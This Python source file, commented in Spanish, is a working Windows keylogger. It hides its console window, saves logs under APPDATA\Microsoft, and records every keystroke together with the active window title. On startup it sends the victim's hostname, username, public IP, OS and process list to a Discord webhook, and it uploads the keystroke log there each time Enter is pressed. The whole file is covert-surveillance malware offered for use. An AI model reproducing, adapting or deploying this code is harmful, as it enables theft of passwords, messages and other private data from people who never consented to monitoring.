import os
import ctypes
import socket
import platform
import requests
import time
import uuid
import psutil
import getpass
from pynput.keyboard import Key, Listener
from dhooks import Webhook, File
from datetime import datetime
from dhooks import Embed
#
#
#
#8888888888                                 .d888                    d88P     888888b.                 888  .d888          888 888            d88P     888       888          888      d8b         
#888                                       d88P"                    d88P      888  "88b                888 d88P"           888 888           d88P      888   o   888          888      Y8P         
#888                                       888                     d88P       888  .88P                888 888             888 888          d88P       888  d8b  888          888                  
#8888888    88888888  .d88b.  88888b.      888888 888d888         d88P        8888888K.   8888b.   .d88888 888888 888  888 888 888         d88P        888 d888b 888  .d88888 888  888 888 88888b. 
#888           d88P  d8P  Y8b 888 "88b     888    888P"          d88P         888  "Y88b     "88b d88" 888 888    888  888 888 888        d88P         888d88888b888 d88" 888 888 .88P 888 888 "88b
#888          d88P   88888888 888  888     888    888           d88P          888    888 .d888888 888  888 888    888  888 888 888       d88P          88888P Y88888 888  888 888888K  888 888  888
#888         d88P    Y8b.     888  888 d8b 888    888          d88P           888   d88P 888  888 Y88b 888 888    Y88b 888 888 888      d88P           8888P   Y8888 Y88b 888 888 "88b 888 888  888
#8888888888 88888888  "Y8888  888  888 Y8P 888    888         d88P            8888888P"  "Y888888  "Y88888 888     "Y88888 888 888     d88P            888P     Y888  "Y88888 888  888 888 888  888
#                                                                                                                                                                         888                      
#                                                                                                                                                                         888                      
#  

try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass

WEBHOOK_URL = "PON TU WEBHOOK AQUI"
LOG_DIR = os.path.join(os.getenv("APPDATA") or ".", "Microsoft")
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

LOG_FILE = os.path.join(LOG_DIR, f"log-{uuid.uuid4().hex[:6]}.txt")
log_send = Webhook(WEBHOOK_URL)

# === VARIABLES ===

buffer = []
ultima_ventana = ""
hora_inicio_sesion = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

SPECIAL_KEYS = {
    Key.ctrl_l: "[CTRL]",
    Key.ctrl_r: "[CTRL]",
    Key.alt_l: "[ALT]",
    Key.alt_gr: "[ALTGR]",
    Key.tab: "[TAB]",
    Key.shift: "[SHIFT]",
    Key.shift_r: "[SHIFT]",
    Key.esc: "[ESC]",
    Key.caps_lock: "[CAPS]",
    Key.delete: "[DEL]",
}

# === FUNCIONES ===

def system_info():
    try:
        ip = requests.get("https://api.ipify.org").text
    except:
        ip = "IP no disponible"

    procesos = ", ".join(p.info['name'] for p in psutil.process_iter(['name']) if p.info['name'])
    procesos = procesos[:900] + "..." if len(procesos) > 900 else procesos

    embed = Embed(
        title="🛡️ NUEVA SESIÓN DE KEYLOGGER",
        description="Información del sistema del objetivo.",
        color=0x3498db,  # Azul moderno
        timestamp=hora_inicio_sesion  # Puedes usar datetime.utcnow().isoformat()
    )

    embed.add_field(name="📅 Fecha", value=hora_inicio_sesion, inline=False)
    embed.add_field(name="🖥️ Hostname", value=socket.gethostname(), inline=True)
    embed.add_field(name="👤 Usuario", value=getpass.getuser(), inline=True)
    embed.add_field(name="🌐 IP Pública", value=ip, inline=True)
    embed.add_field(name="🧠 Sistema Operativo", value=f"{platform.system()} {platform.release()}", inline=False)
    embed.add_field(name="📁 Ruta Ejecutable", value=os.path.abspath(__file__), inline=False)
    embed.add_field(name="⚙️ Procesos activos", value=procesos or "No detectados", inline=False)

    embed.set_footer(text="EZEN.FR / Badfull / Wqkin")
    
    try:
        log_send.send(embed=embed)
    except Exception as e:
        pass

def send_log():
    try:
        if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
            log_send.send("📩 Nuevo registro de teclas:")
            log_send.send(file=File(LOG_FILE))
            os.remove(LOG_FILE)
    except:
        pass

def get_active_window():
    try:
        import win32gui
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except:
        return "Desconocida"

def on_press(key):
    global buffer, ultima_ventana

    ventana_actual = get_active_window()
    if ventana_actual != ultima_ventana:
        buffer.append(f"\n\n[{datetime.now().strftime('%H:%M:%S')}] Ventana activa: {ventana_actual}\n")
        ultima_ventana = ventana_actual

    key_str = str(key).replace("'", "")

    if key == Key.space:
        key_str = " "
    elif key == Key.enter:
        key_str = "\n"
    elif key == Key.backspace:
        if buffer:
            buffer.pop()
        return
    elif key in SPECIAL_KEYS:
        key_str = SPECIAL_KEYS[key]
    elif "Key" in key_str:
        return

    buffer.append(key_str)

    if len(buffer) >= 10 or key == Key.enter:
        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                if os.stat(LOG_FILE).st_size == 0:
                    f.write(f"[{datetime.now().strftime('%H:%M:%S')}] ")
                f.write("".join(buffer))
        except:
            pass
        buffer = []

    if key == Key.enter:
        send_log()

system_info()

with Listener(on_press=on_press) as listener:
    listener.join()
